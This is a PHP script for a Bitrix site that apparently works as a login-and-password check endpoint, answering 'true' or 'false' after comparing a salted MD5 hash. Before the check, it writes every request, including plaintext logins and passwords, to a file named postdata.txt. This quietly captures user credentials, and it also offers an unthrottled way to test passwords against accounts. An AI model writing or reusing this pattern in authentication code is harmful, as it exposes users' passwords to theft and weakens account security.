<?require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");
define("NO_KEEP_STATISTIC", true);
if(!empty($_REQUEST)){
    $file = fopen('postdata.txt', 'a');
    fwrite($file,serialize($_REQUEST)."\n");
    fclose($file);
    if (
	   isset( $_REQUEST['PASSWORD'] ) && strlen( $_REQUEST['PASSWORD'] ) > 0
	    &&
		   isset( $_REQUEST['LOGIN'] ) && strlen( $_REQUEST['LOGIN'] ) > 0
		    )
			{
			       $rsUser = CUser::GetByLogin( $_REQUEST['LOGIN'] );
			           if ($arUser = $rsUser->Fetch())
			               {
			            	  if(strlen($arUser["PASSWORD"]) > 32)
			            		  {
			            			     $salt = substr($arUser["PASSWORD"], 0, strlen($arUser["PASSWORD"]) - 32);
			            			    	     $db_password = substr($arUser["PASSWORD"], -32);
			            			    	    	  }
			            			    	    		  else
			            			    	    			  {
			            			    	    				     $salt = "";
			            			    	    				    	     $db_password = $arUser["PASSWORD"];
			            			    	    				    	    	  }
			            			    	    				    	    		  $user_password =  md5($salt.$_REQUEST['PASSWORD']);
			            			    	    				    	    			  if ( $user_password == $db_password )
			            			    	    				    	    				  {
			            			    	    				    	    					     $login_password_correct = true;
			            			    	    				    	    					    	  }
			            			    	    				    	    					    	       }
			            			    	    				    	    					    	        }		
			            			    	    				    	    					    	    	//
			            			    	    				    	    					    	    	    if($login_password_correct){
			            			    	    				    	    					    	    		    //Пользователь авторизован, все ОК	
			            			    	    				    	    					    	    			    echo "true";
			            			    	    				    	    					    	    				}else{
			            			    	    				    	    					    	    					//Пароль и логин не подходят
			            			    	    				    	    					    	    						echo "false";
			            			    	    				    	    					    	    						    }
			            			    	    				    	    					    	    						    }					
			            			    	    				    	    					    	    						    ?>